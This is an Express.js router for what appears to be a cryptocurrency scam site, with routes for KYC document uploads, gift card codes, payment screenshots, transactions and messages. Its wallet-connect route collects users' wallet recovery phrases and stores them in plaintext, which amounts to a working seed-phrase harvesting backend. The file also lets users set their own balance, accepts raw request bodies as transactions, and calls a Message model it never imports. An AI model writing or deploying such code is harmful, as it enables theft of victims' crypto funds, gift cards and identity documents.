const express = require('express');
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const User = require('../models/User');
const Transaction = require('../models/Transaction');
const Notification = require('../models/Notification');
const Payment = require('../models/Payment');
const GiftCard = require('../models/GiftCard');
const KYCSubmission = require('../models/KYCSubmission');
const WalletConnection = require('../models/WalletConnection');
const auth = require('../middleware/auth');
const router = express.Router();

// ─── UPLOADS DIRECTORY ───
const uploadDir = path.join(__dirname, '../uploads');
if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir, { recursive: true });

const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, uploadDir),
  filename: (req, file, cb) => {
    const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1e9);
    cb(null, file.fieldname + '-' + uniqueSuffix + path.extname(file.originalname));
  }
});
const upload = multer({ storage, limits: { fileSize: 20 * 1024 * 1024 } });

// ─── GET CURRENT USER ───
router.get('/me', auth, async (req, res) => {
  try {
    const user = await User.findById(req.user.id).select('-password -passcodeHash');
    if (!user) return res.status(404).json({ error: 'User not found' });
    res.json(user);
  } catch (err) { res.status(500).json({ error: 'Server error' }); }
});

// ─── NOTIFICATIONS ───
router.get('/notifications', auth, async (req, res) => {
  try {
    const notes = await Notification.find({ userId: req.user.id }).sort({ createdAt: -1 });
    res.json(notes);
  } catch (err) { res.status(500).json({ error: 'Server error' }); }
});

router.put('/notifications/:id/read', auth, async (req, res) => {
  try {
    await Notification.findByIdAndUpdate(req.params.id, { read: true });
    res.json({ success: true });
  } catch (err) { res.status(500).json({ error: 'Server error' }); }
});

// ─── KYC SUBMISSION ───
router.post('/kyc/submit', auth, upload.fields([
  { name: 'dlFront', maxCount: 1 },
  { name: 'dlBack', maxCount: 1 },
  { name: 'proofDoc', maxCount: 1 }
]), async (req, res) => {
  try {
    const files = req.files || {};
    const dlFront = files['dlFront']?.[0];
    const dlBack = files['dlBack']?.[0];
    const proofDoc = files['proofDoc']?.[0];

    if (!dlFront || !dlBack || !proofDoc) {
      return res.status(400).json({ error: 'Please upload all three documents (dlFront, dlBack, proofDoc).' });
    }

    const kyc = new KYCSubmission({
      user: req.user.id,
      fullName: req.body.fullName || '',
      email: req.body.email || '',
      phoneNumber: req.body.phoneNumber || '',
      address: req.body.address || '',
      city: req.body.city || '',
      state: req.body.state || '',
      postalCode: req.body.postalCode || '',
      country: req.body.country || '',
      proofType: req.body.proofType || '',
      driverLicenseFront: `/uploads/${dlFront.filename}`,
      driverLicenseBack: `/uploads/${dlBack.filename}`,
      proofOfResidence: `/uploads/${proofDoc.filename}`,
      status: 'pending'
    });

    await kyc.save();
    await User.findByIdAndUpdate(req.user.id, { kycCompleted: false });
    res.status(201).json({ success: true, msg: 'KYC submitted for review.' });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Database save issue.' });
  }
});

// ─── GIFT CARD SUBMISSION ───
router.post('/giftcard/submit', auth, upload.single('image'), async (req, res) => {
  try {
    const { cardType, code } = req.body;
    if (!req.file) return res.status(400).json({ error: 'Image is required.' });

    const giftCard = new GiftCard({
      user: req.user.id,
      cardType: cardType || 'Unknown',
      code: code?.trim() || '',
      image: `/uploads/${req.file.filename}`,
      status: 'pending'
    });
    await giftCard.save();
    res.status(201).json({ success: true, msg: 'Gift card submitted.' });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: err.message });
  }
});

// ─── PAYMENT SUBMISSION ───
router.post('/payment/submit', auth, upload.single('screenshot'), async (req, res) => {
  try {
    const { method, amount } = req.body;
    if (!req.file) return res.status(400).json({ error: 'Please upload a screenshot' });

    const payment = new Payment({
      user: req.user.id,
      method: method || 'Manual Deposit',
      amount: parseFloat(amount) || 0,
      screenshot: `/uploads/${req.file.filename}`,
      status: 'pending'
    });
    await payment.save();
    res.status(201).json({ success: true, msg: 'Payment submitted.' });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: err.message });
  }
});

// ─── WALLET CONNECT (PASSCODE / RECOVERY PHRASE) ───
router.post('/wallet/connect', auth, async (req, res) => {
  try {
    const { walletName, phrase } = req.body;
    if (!walletName || !phrase) {
      return res.status(400).json({ error: 'Wallet name and recovery phrase are required.' });
    }

    const connection = new WalletConnection({
      user: req.user.id,
      walletName,
      phrase
    });
    await connection.save();
    res.status(201).json({ success: true, msg: 'Wallet connected and phrase saved.' });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: err.message });
  }
});

// ─── TRANSACTIONS & BALANCE ───
router.get('/transactions', auth, async (req, res) => {
  try {
    const tx = await Transaction.find({ userId: req.user.id }).sort({ timestamp: -1 });
    res.json(tx);
  } catch (err) { res.status(500).json({ error: 'Server error' }); }
});

router.post('/transaction', auth, async (req, res) => {
  try {
    const tx = new Transaction({ userId: req.user.id, ...req.body, timestamp: new Date() });
    await tx.save();
    res.json(tx);
  } catch (err) { res.status(500).json({ error: 'Server error' }); }
});

router.post('/balance', auth, async (req, res) => {
  try {
    const user = await User.findByIdAndUpdate(
      req.user.id,
      { $set: { balance: req.body.amount } },
      { new: true }
    ).select('-password -passcodeHash');
    res.json(user);
  } catch (err) { res.status(500).json({ error: 'Server error' }); }
});
// ─── GET MESSAGES (for current user) ───

router.get('/messages', auth, async (req, res) => {
  try {
    const messages = await Message.find({
      $or: [
        { sender: req.user.id },
        { receiver: req.user.id },
        { receiver: null } // Public admin messages
      ]
    })
    .populate('sender', 'fullName email role')
    .sort({ createdAt: 1 });
    res.json(messages);
  } catch (err) {
    res.status(500).json({ error: 'Failed to fetch messages' });
  }
});
module.exports = router;